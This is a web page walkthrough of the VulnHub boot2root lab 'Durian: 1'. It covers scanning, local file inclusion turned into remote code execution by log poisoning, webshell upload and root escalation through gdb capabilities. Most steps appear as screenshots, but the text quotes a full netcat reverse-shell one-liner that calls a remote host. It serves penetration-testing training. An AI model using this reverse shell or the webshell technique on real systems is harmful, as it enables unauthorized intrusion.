<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Durian: 1 Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/durian-1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2020-09-26T10:15:32+00:00">September 26, 2020</time><time class="updated" datetime="2025-07-10T17:12:05+00:00">July 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we are going to solve another boot2root challenge called “<strong>Durian: 1</strong>“.  It’s available at VulnHub for penetration testing and you can download it from <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.vulnhub.com/entry/durian-1,553/">here</a></strong></span>.</span></p>
<p><span style="color: #000000;">The merit of making this lab is due to <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="mailto:suncsr.challenges@gmail.com">SunCSR Team</a></strong>.</span> Let’s start and learn how to break it down successfully.</span></p>
<p><span style="color: #000000;">Level: <strong>Hard</strong></span></p>
<h3><span style="color: #800000;">Penetration Testing Methodology</span></h3>
<p><span style="color: #000000;"><strong>Reconnaissance</strong></span></p>
<ul>
<li><span style="color: #000000;">Netdiscover</span></li>
<li><span style="color: #000000;">Nmap</span></li>
</ul>
<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
<ul>
<li><span style="color: #000000;">Dirsearch</span></li>
<li><span style="color: #000000;">Linpeas.sh</span></li>
</ul>
<p><span style="color: #000000;"><strong>Exploiting</strong></span></p>
<ul>
<li><span style="color: #000000;">LFI + RCE log poisoning</span></li>
</ul>
<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
<ul>
<li><span style="color: #000000;">Abuse of capabilities gdb</span></li>
<li><span style="color: #000000;">Capture the flag</span></li>
</ul>
<h3><span style="color: #800000;">Walkthrough</span></h3>
<h3><span style="color: #800000;">Reconnaissance</span></h3>
<p><span style="color: #000000;">We are looking for the machine with netdiscover</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">netdiscover -i ethX</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4FYrapN2kVI/X28PJ0RLu9I/AAAAAAAAo7A/7F_RVJDWXdQagoM6pf0rgDVmsqpDITo9wCLcBGAsYHQ/s16000/1.png"/></span></p>
<p><span style="color: #000000;">So, let’s start by running map to all ports.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p- 192.168.10.184</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-6I9Db3xFLWM/X28PhpmYB1I/AAAAAAAAo7M/aZ8vktxeqqov_YUgnanPHZIDRBbJsikAACLcBGAsYHQ/s16000/2.png"/></span></p>
<h3><span style="color: #800000;">Enumeration</span></h3>
<p><span style="color: #000000;">Then, we add the IP address to our <strong>/etc/hosts</strong> to work more comfortably and we list services, directories and files of the three exposed web services. </span><span style="color: #000000;">We find interesting and yet vulnerable services like this <strong>OpenLiteSpeed Web Server</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-UeLGNHlq8U0/X28Pp7zPKiI/AAAAAAAAo7Q/LdPQkntqxdowpVdiZ24KQXLDOCY4s4P-wCLcBGAsYHQ/s16000/3.png"/></span></p>
<p><span style="color: #000000;">This version is vulnerable to <strong>null-byte poisoning</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-VPN8wIhwlwY/X28Pz5PcNqI/AAAAAAAAo7Y/emXseLxissQTPHKB0auJLtjtCJlrMLl_gCLcBGAsYHQ/s16000/4.png"/></span></p>
<p><span style="color: #000000;">But even if it is too “juicy” it will not serve us, it is a “rabbit hole”.</span></p>
<p><span style="color: #000000;">We continue through the <u>port 80 web service</u>:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gXRUua3QOpQ/X28P-Wn-tII/AAAAAAAAo7g/DE8ijSkP-Cw-vI1LVuXvaoV3SjVfZBlfgCLcBGAsYHQ/s16000/5.png"/></span></p>
<p><span style="color: #000000;">Now we used <strong>dirsearch</strong> with <strong>a medium dictionary</strong> and found a couple of directories that look interesting, but we will go to “<strong>/cgi-data/</strong>“.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-yl1Ew5dW5Lk/X28QJQ5eR5I/AAAAAAAAo7o/v1i-KvOX1lco3pzlhREZqB0VIUFVMqw5QCLcBGAsYHQ/s16000/6.png"/></span></p>
<p><span style="color: #000000;">We access the directory and find a file that as its name indicates will allow us to load files. But we have to find out which variable the file needs.</span></p>
<p><span style="color: #000000;">There are two options (surely there are more) to find out.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_IPwlGeJnPg/X28QSsE3tsI/AAAAAAAAo7s/D-8tJNuTeJsy4lY6UHEJwz2psslS7x0ewCLcBGAsYHQ/s16000/7.png"/></span></p>
<p><span style="color: #000000;"><strong>Option 1:</strong></span></p>
<p><span style="color: #000000;">The syntax is commented from the source code.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-rzgJaZWx5Po/X28QiA3YOGI/AAAAAAAAo70/DiFu170evi878HaCeRByzQupaA2W6bJ0wCLcBGAsYHQ/s16000/8.png"/></span></p>
<h3><span style="color: #800000;">Option 2:</span></h3>
<p><span style="color: #000000;">You will find sometimes with audits or pentest that the code of the application will be totally black box. <strong>Wfuzz</strong> is usually very good for these cases:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-uxLKdrO5KkM/X28QtrIeFgI/AAAAAAAAo78/PgTYsRhZOOAk2U7DiPdPo9PPHTpc_KNHACLcBGAsYHQ/s16000/9.png"/></span></p>
<p><span style="color: #000000;">We do a proof of concept as evidence of vulnerability.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-741rQQDX0aQ/X28Q2c6RoiI/AAAAAAAAo8E/FIzPmICRSBYCX-ZFGAkar2M_6x9ssYJZQCLcBGAsYHQ/s16000/10.png"/></span></p>
<h3><span style="color: #800000;">Exploiting</span></h3>
<p><span style="color: #000000;">This was for me the most complicated part of the box, as it took me more than a day to list the machine’s custom log file.</span></p>
<p><span style="color: #000000;">For the enumeration, I used <strong>burp</strong>, a <strong>custom dictionary of log paths</strong> and the word “<strong>durian</strong>” (machine name).</span></p>
<p><span style="color: #000000;"><strong><u>Request:</u></strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-knDxYlaLtIE/X28RC4GMRMI/AAAAAAAAo8M/GC_l6RCcC5MT1MlPeUYGXcWSIAPtx28dQCLcBGAsYHQ/s16000/11.png"/></span></p>
<p><span style="color: #000000;"><strong><u>Response:</u></strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-3xC91WChT4k/X28RJNgZAZI/AAAAAAAAo8U/d2p6hkA3uuM7TJJ_5I-nJ9PW0kp3f_ncwCLcBGAsYHQ/s16000/12.png"/></span></p>
<p><span style="color: #000000;">Once found (and excited hehe) we do a proof of concept of <strong>RCE</strong> (Remote Code Execution)</span></p>
<p><span style="color: #000000;"><strong><u>Request:</u></strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FwtzT6B_G50/X28RTRM6ePI/AAAAAAAAo8c/IK8L9dkc9aMcSa9hLw1B3Jbvi4NilRhIwCLcBGAsYHQ/s16000/13.png"/></span></p>
<p><span style="color: #000000;"><strong><u>Response:</u></strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-UxYqrnal8M4/X28Ra-osUXI/AAAAAAAAo8k/TtF0LSfsgUobNhYmFfzcVa847nZGA31VwCLcBGAsYHQ/s16000/14.png"/></span></p>
<p><span style="color: #000000;">Here I had trouble running a reverse shell directly with “<em>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</em>“. So I decided to use the “<strong>pentestmonkeys</strong>” webshell, raise a python server in my kali and download it in the “<strong>/var/www/html/blog/</strong>” path where I had writing permissions and later we can run it.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xx50o9nJYaE/X28RhlJt7JI/AAAAAAAAo8o/XPnsYhtnV5ICTc8hnh2HoAvaYSZ9uA1mgCLcBGAsYHQ/s16000/15.png"/></span></p>
<p><span style="color: #000000;">Here we see how the server has downloaded it from our python server.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DMKlVmBQaEY/X28RsIrPq6I/AAAAAAAAo80/_kWE8EctV9Q36rdbBmakcUg_NRbAoayAwCLcBGAsYHQ/s16000/16.png"/></span></p>
<p><span style="color: #000000;">Then we raise a listening netcat and execute the webshell from the url “<strong>http://IP/blog/shell.php</strong>“. </span><span style="color: #000000;">Once inside, we execute as always our two commands to get an interactive revshell.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CyNjA6h8uvs/X28RywuBWqI/AAAAAAAAo88/0djYnQQHi5k6jRVfIs3Xe4DD2c_sTlfFgCLcBGAsYHQ/s16000/17.png"/></span></p>
<h3><span style="color: #800000;">Privilege Escalation (root)</span></h3>
<p><span style="color: #000000;">We check the user’s “<strong>durian</strong>” folder and execute the command “<strong>sudo -l</strong>“. We see that we can execute two commands as the root user and without a password. (Now you will see that I did the escalation without either of those two commands)</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-a0RwbDBZ9cw/X28R9yX3LaI/AAAAAAAAo9E/lYf23xKdWG049WHYAzmr3hfLv7-HVzRMwCLcBGAsYHQ/s16000/18.png"/></span></p>
<p><span style="color: #000000;">We run “<strong>linpeas.sh</strong>” and list that we can abuse the “<strong>gdb</strong>” binary for its capabilities.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-3XIYls_SwP4/X28SERvhHSI/AAAAAAAAo9I/k3I9W45DvXkPhn-QNSN7alYWLlhKWP9qgCLcBGAsYHQ/s16000/19.png"/></span></p>
<p><span style="color: #000000;">We execute the following syntax that will allow us to scale privileges as the <strong>root</strong> user and read our <strong>proof.txt</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-elxFhLbH62s/X28SM0a8qVI/AAAAAAAAo9M/59oKjZ3rDgILQ93O5TjAjc0054463YViQCLcBGAsYHQ/s16000/20.png"/></span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more VulnHub Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
<p><span style="color: #000000;"><strong>Author</strong>: <strong>David Utón</strong> is Penetration Tester and security auditor for Web applications, perimeter networks, internal and industrial corporate infrastructures, and wireless networks. Contacted on <strong>LinkedIn</strong> and <strong><a style="color: #000000;" href="https://twitter.com/David_Uton">Twitter</a></strong>.</span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
